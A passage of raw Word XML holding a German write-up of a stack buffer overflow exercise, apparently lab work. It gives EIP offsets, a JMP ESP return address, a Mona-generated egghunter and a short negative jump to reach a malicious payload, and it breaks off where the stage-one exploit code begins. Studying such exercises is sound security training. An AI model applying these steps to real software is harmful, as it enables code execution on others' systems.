                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="20550BA8" w14:textId="79ACF2E9" w:rsidR="00591243" w:rsidRPr="00B47CB9" w:rsidRDefault="00591243" w:rsidP="00770ABD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AEFCE66" w14:textId="34AA175E" w:rsidR="00591243" w:rsidRPr="00B47CB9" w:rsidRDefault="000759C8" w:rsidP="00F70574">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Nach </w:t>
      </w:r>
      <w:r w:rsidR="00771D26" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Anpassung der Variablen </w:t>
      </w:r>
      <w:r w:rsidR="00F70574" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>(a = b'\x41'*36, b = b'\x42'*4, c = b'\x43'*4) wurde herausgefunden, dass das E</w:t>
      </w:r>
      <w:r w:rsidR="006F1660" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">BP Register nach 36 Byte und dass EIP Register nach </w:t>
      </w:r>
      <w:r w:rsidR="00776FCF" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>40 Byte überschreiben wird.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01C87FEC" w14:textId="330A3F78" w:rsidR="00776FCF" w:rsidRDefault="00776FCF" w:rsidP="00F70574">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="09359230" wp14:editId="6735E53F">
            <wp:extent cx="1838325" cy="838200"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:docPr id="127" name="Grafik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838325" cy="838200"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B31BCEE" w14:textId="77777777" w:rsidR="0010726E" w:rsidRPr="00B47CB9" w:rsidRDefault="0010726E" w:rsidP="00F70574">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D56151C" w14:textId="2E3A4CD9" w:rsidR="0000514B" w:rsidRPr="00B47CB9" w:rsidRDefault="00312D92" w:rsidP="00F70574">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Um den bösartigen Shellcode starten zu können verwenden wir </w:t>
      </w:r>
      <w:r w:rsidR="00E1122A">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
        <w:t>JMP ESP</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
        <w:t>. Mithilfe von Immunity und Mona suchen wir nach eine</w:t>
      </w:r>
      <w:r w:rsidR="00B976FC" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">m JMP ESP in eine Windows DLL. </w:t>
      </w:r>
      <w:r w:rsidR="00A4355D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Mit ‚mona modules‘ </w:t>
      </w:r>
      <w:r w:rsidR="0067097F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
        <w:t>können die Module ausgelistet werden.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A628BFE" w14:textId="11A17661" w:rsidR="0067097F" w:rsidRPr="00B47CB9" w:rsidRDefault="0067097F" w:rsidP="00F70574">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A471850" w14:textId="6BBAFC45" w:rsidR="0067097F" w:rsidRPr="00B47CB9" w:rsidRDefault="0067097F" w:rsidP="00F70574">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2D62FA3D" wp14:editId="03122FA8">
            <wp:extent cx="5759450" cy="2084705"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="128" name="Grafik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084705"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F6CE4C4" w14:textId="6226088C" w:rsidR="0067097F" w:rsidRPr="00B47CB9" w:rsidRDefault="0067097F" w:rsidP="00F70574">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6822D892" w14:textId="1011E0C4" w:rsidR="0067097F" w:rsidRPr="00B47CB9" w:rsidRDefault="002D6087" w:rsidP="00F70574">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Es ist zwar zu </w:t>
      </w:r>
      <w:r w:rsidR="003F3B86" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>erkennen</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, dass </w:t>
      </w:r>
      <w:r w:rsidR="003F3B86" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ASLR noch aktiviert ist</w:t>
      </w:r>
      <w:r w:rsidR="00527608" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>, jedoch wurde dies über das Betriebssystem deaktiviert.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E870A9" w14:textId="2836B260" w:rsidR="0081729D" w:rsidRPr="00B47CB9" w:rsidRDefault="0081729D" w:rsidP="00F70574">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5565E271" w14:textId="0FD204EF" w:rsidR="0081729D" w:rsidRPr="00B47CB9" w:rsidRDefault="00485DFB" w:rsidP="00F70574">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Mithilfe der Funktion in Immunity ‚Search for -&gt; All Commands in all modules’ wurde nach </w:t>
      </w:r>
      <w:r w:rsidR="00FC25D9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>einem ‚JMP ESP‘ gesucht.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07140EB5" w14:textId="2784ECFA" w:rsidR="006D6772" w:rsidRPr="00B47CB9" w:rsidRDefault="006D6772" w:rsidP="00F70574">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="318407A4" w14:textId="555EEE81" w:rsidR="006D6772" w:rsidRPr="00B47CB9" w:rsidRDefault="006D6772" w:rsidP="00F70574">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="14B89BD2" wp14:editId="19971DCD">
            <wp:extent cx="5759450" cy="890270"/>
            <wp:effectExtent l="0" t="0" r="0" b="5080"/>
            <wp:docPr id="129" name="Grafik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59450" cy="890270"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="35F0AB12" w14:textId="7FFC73C1" w:rsidR="006D6772" w:rsidRPr="00B47CB9" w:rsidRDefault="006D6772" w:rsidP="00F70574">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12F1AA7A" w14:textId="34EB412C" w:rsidR="006D6772" w:rsidRPr="00B47CB9" w:rsidRDefault="004D017F" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Das JMP ESP mit der relativen Sprungadresse 77F1E684 we</w:t>
      </w:r>
      <w:r w:rsidR="00E1122A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>t keine Bad Chars auf und wird daher verwendet werden. Aufgrund der little Endian Speicheradressierung muss die Sprungadresse rückwärts in den Buffer eingefügt werden.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E5A92AE" w14:textId="13B9E9DE" w:rsidR="004D017F" w:rsidRPr="00B47CB9" w:rsidRDefault="004D017F" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E4D9628" w14:textId="23FE9343" w:rsidR="004D017F" w:rsidRPr="00B47CB9" w:rsidRDefault="004D017F" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">77F1E684 -&gt; </w:t>
      </w:r>
      <w:r w:rsidR="00044441" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>\x84\xE6\xF1\x77</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78642902" w14:textId="4E820375" w:rsidR="00106B50" w:rsidRPr="00B47CB9" w:rsidRDefault="00106B50" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CCB8208" w14:textId="20C1A59E" w:rsidR="00D219C8" w:rsidRPr="00B47CB9" w:rsidRDefault="00D219C8" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ändern des Codes und </w:t>
      </w:r>
      <w:r w:rsidR="00850C1F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Überprüfung, ob EIP getroffen wird:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F9EBFF" w14:textId="49DF8BCF" w:rsidR="00106B50" w:rsidRPr="00B47CB9" w:rsidRDefault="00106B50" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="20035520" wp14:editId="3AE566B2">
            <wp:extent cx="1666875" cy="200025"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="131" name="Grafik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666875" cy="200025"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AABE98D" w14:textId="504B78B4" w:rsidR="00044441" w:rsidRPr="00B47CB9" w:rsidRDefault="00211B3C" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Da wir nicht immer mit genügend Bytes gesegnet sind, um den Schadcode </w:t>
      </w:r>
      <w:r w:rsidR="00C20BB0" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">direkt ausführen zu können benötigt man einen Egghunter. </w:t>
      </w:r>
      <w:r w:rsidR="00A85139" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Beim Egghunting handelt es sich um eine Technik</w:t>
      </w:r>
      <w:r w:rsidR="00C72BBE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, um nach einem Payload suchen zu können. </w:t>
      </w:r>
      <w:r w:rsidR="00AC5E4E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Das erledigt der Egghunter. </w:t>
      </w:r>
      <w:r w:rsidR="00556CA9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Der Payload ist mit einem Tag markiert, welcher als Egg bezeichnet wird.</w:t>
      </w:r>
      <w:r w:rsidR="007C5CE2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Der Egghunter sucht also nach </w:t>
      </w:r>
      <w:r w:rsidR="005E6ED4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>dem</w:t>
      </w:r>
      <w:r w:rsidR="007C5CE2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00527D1D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Tag,</w:t>
      </w:r>
      <w:r w:rsidR="007C5CE2" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> der den Schadecode markiert. </w:t>
      </w:r>
      <w:r w:rsidR="00F156AE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Mithilfe von Mona </w:t>
      </w:r>
      <w:r w:rsidR="00D7125D" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">und dem Befehl „Mona egg“ </w:t>
      </w:r>
      <w:r w:rsidR="00F156AE" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>wurde der Egghunter Code erstellt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5BF6E3" w14:textId="5CA0256E" w:rsidR="00D7125D" w:rsidRPr="00B47CB9" w:rsidRDefault="00D7125D" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="708B63EC" wp14:editId="2E8553F7">
            <wp:extent cx="4591050" cy="1190625"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="130" name="Grafik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591050" cy="1190625"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C8E73F" w14:textId="20675DD7" w:rsidR="00D7125D" w:rsidRPr="00B47CB9" w:rsidRDefault="00D7125D" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3887B748" w14:textId="3DB87026" w:rsidR="00D7125D" w:rsidRPr="00B47CB9" w:rsidRDefault="00D7125D" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Dieser sucht </w:t>
      </w:r>
      <w:r w:rsidR="00E821B9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>standardmäßig</w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> nach dem egg ‚w00t‘. </w:t>
      </w:r>
      <w:r w:rsidR="003D4C64" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Mit der option -t könnte ein individuelles Egg hinterlegt werden.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B3314D" w14:textId="60774C75" w:rsidR="006D4DF2" w:rsidRPr="00B47CB9" w:rsidRDefault="006D4DF2" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BBD1D83" w14:textId="0D3BDC44" w:rsidR="006D4DF2" w:rsidRPr="00B47CB9" w:rsidRDefault="006D4DF2" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Der Egghunter </w:t>
      </w:r>
      <w:r w:rsidR="00AD5EC9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">hat eine Größe von 32 Byte. Da </w:t>
      </w:r>
      <w:r w:rsidR="005B1F2C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>vor dem Überschreiben des EIP Registers 40 Byte Platz ist</w:t>
      </w:r>
      <w:r w:rsidR="009C1319">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="005B1F2C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> wurde sich dafür entschieden</w:t>
      </w:r>
      <w:r w:rsidR="009C1319">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="005B1F2C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> den Egghunter </w:t>
      </w:r>
      <w:r w:rsidR="00007104" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">davor zu platzieren. </w:t>
      </w:r>
      <w:r w:rsidR="00D76962" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Um </w:t>
      </w:r>
      <w:r w:rsidR="00A17990" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">dem Egghunter ausführen zu können wurde </w:t>
      </w:r>
      <w:r w:rsidR="00B07A5E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">nach dem </w:t>
      </w:r>
      <w:r w:rsidR="003F52A9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">JMP ESP ein Short Jmp (Opcode </w:t>
      </w:r>
      <w:r w:rsidR="00E54D18" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>\x</w:t>
      </w:r>
      <w:r w:rsidR="003F52A9" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">EB) </w:t>
      </w:r>
      <w:r w:rsidR="00E54D18" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">auf -44 Byte (\xD4) </w:t>
      </w:r>
      <w:r w:rsidR="007B32E5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>angefügt. Somit landen wir in den NOPs und</w:t>
      </w:r>
      <w:r w:rsidR="009C1319">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> der</w:t>
      </w:r>
      <w:r w:rsidR="007B32E5" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00095165" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Egghunter Code wird anschließend ausgeführt.</w:t>
      </w:r>
      <w:r w:rsidR="005C6678" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Es wäre </w:t>
      </w:r>
      <w:r w:rsidR="00F81F7B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>auch</w:t>
      </w:r>
      <w:r w:rsidR="005C6678" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> möglich gewesen den Egghunter direkt nach dem </w:t>
      </w:r>
      <w:r w:rsidR="00F05E6B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>JMP ESP</w:t>
      </w:r>
      <w:r w:rsidR="00C93479" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> und den NOP‘s</w:t>
      </w:r>
      <w:r w:rsidR="00F05E6B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> zu platzieren</w:t>
      </w:r>
      <w:r w:rsidR="008433FA" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (genug Platz sollte da sein)</w:t>
      </w:r>
      <w:r w:rsidR="00F05E6B" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>, ich wollte in diesem Beispiel testen</w:t>
      </w:r>
      <w:r w:rsidR="00457C41" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, ob der Exploit auch </w:t>
      </w:r>
      <w:r w:rsidR="0026579C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>bei einem negativen Jump</w:t>
      </w:r>
      <w:r w:rsidR="00457C41" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> funktioniert.</w:t>
      </w:r>
      <w:r w:rsidR="00223142">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Außerdem spart das so Zeichen, </w:t>
      </w:r>
      <w:r w:rsidR="00350BF6">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>weniger ist mehr lautet die Devise.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B25DD4" w14:textId="1FC66276" w:rsidR="00095165" w:rsidRPr="00B47CB9" w:rsidRDefault="00095165" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18BC178B" w14:textId="22FB4735" w:rsidR="00095165" w:rsidRPr="00B47CB9" w:rsidRDefault="00095165" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Der </w:t>
      </w:r>
      <w:r w:rsidR="00226A59" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Code für die erste Stage lautet also wie folgt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE775BA" w14:textId="769C2042" w:rsidR="00226A59" w:rsidRPr="00B47CB9" w:rsidRDefault="00226A59" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00226A59" w:rsidRPr="00866A18" w14:paraId="2184912D" w14:textId="77777777" w:rsidTr="00226A59">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="68D0FB3E" w14:textId="77777777" w:rsidR="0018600A" w:rsidRPr="00B47CB9" w:rsidRDefault="0018600A" w:rsidP="0018600A">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
